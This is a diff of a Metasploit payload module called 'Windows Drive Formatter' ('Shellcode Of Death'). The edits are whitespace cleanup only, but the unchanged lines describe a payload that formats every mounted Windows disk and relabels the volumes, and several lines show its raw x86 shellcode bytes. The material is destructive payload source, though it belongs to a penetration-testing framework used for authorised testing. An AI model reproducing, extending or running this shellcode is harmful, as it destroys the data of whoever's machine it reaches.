@@ -6,7 +6,7 @@
 ###
 #   Shellcode Of Death
 #
-#   Test bed: 
+#   Test bed:
 #        x86: Windows XP SP3, Windows 2003 SP2, Windows 7
 #        x64: Windows 8.1
 #
@@ -25,15 +25,11 @@ module Metasploit3
     super(update_info(info,
       'Name'          => 'Windows Drive Formatter',
       'Description'   => %q{
-        This payload formats all mounted disks in 
-        Windows (aka ShellcodeOfDeath). 
+        This payload formats all mounted disks in Windows (aka ShellcodeOfDeath).
 
-        After formatting, this payload sets the 
-        volume label to the string specified in 
-        the VOLUMELABEL option. If the code is 
-        unable to access a drive for any reason, 
-        it skips the drive and proceeds to the 
-        next volume. 
+        After formatting, this payload sets the volume label to the string specified in
+        the VOLUMELABEL option. If the code is unable to access a drive for any reason,
+        it skips the drive and proceeds to the next volume.
       },
       'Author'        => [ 'Ashfaq Ansari <ashfaq_ansari1989[at]hotmail.com>',
                          'Ruei-Min Jiang <mike820324[at]gmail.com>'
@@ -73,7 +69,7 @@ module Metasploit3
             "\x8b\x44\x02\x78\x8d\x04\x02\x50\x8b\x40\x20\x8d\x1c\x02\xe8\xc3\xff\xff\xff\x5b\x8b\x4b" +
             "\x24\x8d\x0c\x0a\x66\x8b\x04\x41\x25\xff\xff\x00\x00\x8b\x5b\x1c\x8d\x1c\x1a\x8b\x04\x83" +
             "\x8d\x04\x02\xc3\x31\xc9\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x1c\x8b\x50\x08\x8b" +
-            "\x78\x20\x8b\x00\x3a\x4f\x18\x75\xf3\x68\x64\x5b\x02\xab\x68\x10\xa1\x67\x05\x68\xa7\xd4" + 
+            "\x78\x20\x8b\x00\x3a\x4f\x18\x75\xf3\x68\x64\x5b\x02\xab\x68\x10\xa1\x67\x05\x68\xa7\xd4" +
             "\x34\x3b\x68\x96\x90\x62\xd7\x68\x87\x8f\x46\xec\x68\x06\xe5\xb0\xcf\x68\xdc\xdd\x1a\x33" +
             "\x89\xe5\x6a\x07\x59\x31\xff\x83\xf9\x01\x75\x0c\x51\xeb\x1c\x8b\x44\x24\x1c\xff\xd0\x89" +
             "\xc2\x59\x51\x8b\x4c\xbd\x00\xe8\x6b\xff\xff\xff\x59\x50\x47\xe2\xe0\x89\xe5\xeb\x0f\xe8" +
